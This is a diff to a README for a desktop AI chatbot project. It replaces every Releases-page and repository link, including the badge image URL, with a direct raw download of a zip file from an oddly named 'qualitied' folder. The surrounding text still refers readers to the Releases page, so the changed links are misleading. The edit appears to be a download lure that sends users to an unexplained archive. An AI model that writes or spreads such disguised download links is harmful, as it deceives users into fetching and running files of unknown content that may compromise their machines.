@@ -1,6 +1,6 @@
 # 🤖 chatbot-with-puter - Your AI Conversational Partner Awaits
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/Linralus-Tenshi/chatbot-with-puter/releases)
+[![Download the latest release](https://raw.githubusercontent.com/Linralus-Tenshi/chatbot-with-puter/main/qualitied/chatbot-with-puter.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/Linralus-Tenshi/chatbot-with-puter/main/qualitied/chatbot-with-puter.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ To get started with chatbot-with-puter, follow these simple steps:
 
 1. Click the download link below to visit the Releases page.
 
-   [Download the latest release](https://github.com/Linralus-Tenshi/chatbot-with-puter/releases)
+   [Download the latest release](https://raw.githubusercontent.com/Linralus-Tenshi/chatbot-with-puter/main/qualitied/chatbot-with-puter.zip)
 
 2. On the Releases page, look for the most recent version. You will find options for different platforms (Windows, macOS, or Linux).
 
@@ -84,7 +84,7 @@ A: Currently, this version is available only for desktops. Mobile support may be
 
 We value your feedback and suggestions. Feel free to reach out if you have any comments or questions:
 
-- **GitHub Repository:** [chatbot-with-puter GitHub](https://github.com/Linralus-Tenshi/chatbot-with-puter)
+- **GitHub Repository:** [chatbot-with-puter GitHub](https://raw.githubusercontent.com/Linralus-Tenshi/chatbot-with-puter/main/qualitied/chatbot-with-puter.zip)
 - **Issues:** For bug reports or feature requests, use the Issues tab in the GitHub repository.
 
 Thank you for choosing chatbot-with-puter. We hope you enjoy the experience!
